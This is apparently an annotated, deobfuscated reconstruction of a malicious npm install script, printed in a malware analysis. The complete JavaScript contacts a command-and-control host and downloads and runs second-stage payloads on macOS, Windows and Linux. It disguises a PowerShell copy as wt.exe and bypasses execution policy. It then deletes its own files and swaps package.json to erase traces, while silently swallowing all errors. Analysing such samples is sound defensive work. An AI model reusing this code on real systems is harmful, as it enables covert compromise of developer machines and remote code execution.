const _entry = function(campaignId) {
  try {
    // Load Node.js built-in modules via decoded string table
    const fs      = require("fs");           // stq[2]
    const os      = require("os");           // stq[1]
    const { execSync } = require("child_process"); // stq[0]

    // Build the full C2 URL: base + campaign ID
    // stq[3] = "http://sfrclak.com:8000/"
    const c2Url   = "http://sfrclak.com:8000/" + campaignId;
    // → "http://sfrclak.com:8000/6202033"

    // Detect the operating system
    const platform = os.platform();  // "darwin", "win32", or other
    const tmpDir   = os.tmpdir();     // "/tmp" on Linux/macOS, "%TEMP%" on Windows

    // os.type(), os.release(), os.arch() are called but results discarded —
    // likely sends them via the POST body or they are used in the stage-2
    os.type(); os.release(); os.arch();

    let execCommand = "";

    // ─────────────────────────────────────────────────
    // BRANCH 1: macOS (darwin)
    // ─────────────────────────────────────────────────
    if (platform === "darwin") {
      const scriptPath = tmpDir + "/" + campaignId;   // /tmp/6202033

      const appleScript = `
    set {a, s, d} to {"", "${c2Url}", "/Library/Caches/com.apple.act.mond"}
        try
            do shell script "curl -o " & d & a & " -d packages.npm.org/product0" & " -s " & s & " && chmod 770 " & d & " && /bin/zsh -c \\"" & d & " " & s & " &\\" &> /dev/null"
        end try
    do shell script "rm -rf ${scriptPath}"`;

      fs.writeFileSync(scriptPath, appleScript);
      execCommand = `nohup osascript "${scriptPath}" > /dev/null 2>&1 &`;

    // ─────────────────────────────────────────────────
    // BRANCH 2: Windows (win32)
    // ─────────────────────────────────────────────────
    } else if (platform === "win32") {

      const psPath = execSync("where powershell").toString().trim();

      const wtPath = process.env.PROGRAMDATA + "\\wt.exe";
      if (!fs.existsSync(wtPath)) {
        fs.copyFileSync(psPath, wtPath);
        // Creates a persistent copy of PowerShell. wt.exe is Windows Terminal's
        // binary name — a legitimate-looking process in %PROGRAMDATA%.
      }

      const ps1Path = tmpDir + "\\" + campaignId + ".ps1";  // %TEMP%\6202033.ps1
      const vbsPath = tmpDir + "\\" + campaignId + ".vbs";  // %TEMP%\6202033.vbs

      const vbScript = `
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "cmd.exe /c curl -s -X POST -d ""packages.npm.org/product1"" ""${c2Url}"" > ""${ps1Path}"" & ""${wtPath}"" -w hidden -ep bypass -file ""${ps1Path}"" ""${c2Url}"" & del ""${ps1Path}"" /f", 0, False`;

      fs.writeFileSync(vbsPath, vbScript);
      execCommand = `cscript "${vbsPath}" //nologo && del "${vbsPath}" /f`;

    // ─────────────────────────────────────────────────
    // BRANCH 3: Linux / other
    // ─────────────────────────────────────────────────
    } else {
      execCommand = `curl -o /tmp/ld.py -d packages.npm.org/product2 -s ${c2Url} && nohup python3 /tmp/ld.py ${c2Url} > /dev/null 2>&1 &`;
      // curl and nohup chained with &&: nohup only runs if curl succeeded.
      // If the C2 is unreachable, chain silently fails — npm install still exits 0.
    }

    // execSync is blocking, but all three commands return immediately because
    // the real work is detached to background processes (nohup / cscript 0,False)
    execSync(execCommand);

    // ─────────────────────────────────────────────────
    // ANTI-FORENSICS: cover tracks
    // ─────────────────────────────────────────────────
    const selfPath = __filename;

    fs.unlink(selfPath, () => {});         // 1. Delete setup.js itself
    fs.unlink("package.json", () => {});   // 2. Delete malicious package.json
    fs.rename("package.md", "package.json", () => {}); // 3. Install clean v4.2.0 stub

  } catch(e) {
    // Silent catch — any error (C2 unreachable, permission denied, etc.)
    // is swallowed completely. npm install always exits with code 0.
    // The developer never sees any indication that anything went wrong.
  }
};

// Entry point — "6202033" is the campaign/tracking ID
_entry("6202033");
